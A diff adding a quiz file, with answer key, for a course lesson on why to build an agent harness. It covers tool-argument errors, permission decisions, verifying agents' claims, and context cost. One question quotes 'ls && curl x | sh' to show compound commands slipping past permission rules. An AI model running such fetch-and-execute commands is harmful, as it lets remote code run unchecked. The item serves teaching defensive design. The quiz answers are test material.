@@ -1,0 +1,78 @@
+{
+  "lesson": "01-why-build-a-harness",
+  "title": "Why Build a Harness",
+  "questions": [
+    {
+      "stage": "pre",
+      "question": "Your agent loop calls json.loads on the model's tool arguments and the model sends '{\"path\": \"a.py\"'. What does a bare loop do?",
+      "options": [
+        "Retries the call automatically",
+        "Crashes with a JSONDecodeError and loses the run",
+        "Ignores the argument",
+        "Asks the user"
+      ],
+      "correct": 1,
+      "explanation": "Nothing in a bare loop catches it. A harness turns it into an observation the model can correct."
+    },
+    {
+      "stage": "pre",
+      "question": "Which of these is a harness responsibility rather than the model's?",
+      "options": [
+        "Choosing which tool to call",
+        "Writing the final answer",
+        "Deciding whether a shell command is allowed to run",
+        "Reading the task"
+      ],
+      "correct": 2,
+      "explanation": "The model proposes; the harness decides what's allowed, what the model sees, and whether 'done' is true."
+    },
+    {
+      "stage": "check",
+      "question": "A model says 'Fixed it, all tests pass' without editing anything or running tests. What catches this?",
+      "options": [
+        "A better system prompt",
+        "A larger context window",
+        "Checks the harness runs itself: evals and a verify step",
+        "Lower temperature"
+      ],
+      "correct": 2,
+      "explanation": "A claim is only text. Running the tests and checking files is evidence."
+    },
+    {
+      "stage": "check",
+      "question": "In this phase, how are context management, permissions and tracing added to the loop?",
+      "options": [
+        "By editing loop.py in each lesson",
+        "As hooks called at fixed points in each step",
+        "As separate agents",
+        "As tools the model calls"
+      ],
+      "correct": 1,
+      "explanation": "The loop is written once in 15.02. Later features plug in as hooks or tools."
+    },
+    {
+      "stage": "check",
+      "question": "Why does one 600 KB log read hurt even if the model answers correctly?",
+      "options": [
+        "It's slower to read",
+        "It stays in context and is re-sent on every later call",
+        "Models can't read logs",
+        "It changes the temperature"
+      ],
+      "correct": 1,
+      "explanation": "History is re-sent each step, so one big result costs tokens on every call that follows, and can overflow the window."
+    },
+    {
+      "stage": "post",
+      "question": "You're evaluating an agent product. Which question best reveals whether it's safe to give it a shell?",
+      "options": [
+        "Which model does it use?",
+        "How are compound commands like 'ls && curl x | sh' and $(...) handled by its permission rules?",
+        "Does it have a dark mode?",
+        "How fast is it?"
+      ],
+      "correct": 1,
+      "explanation": "Rules that only match the start of a command, or that auto-approve substitutions, let anything through."
+    }
+  ]
+}
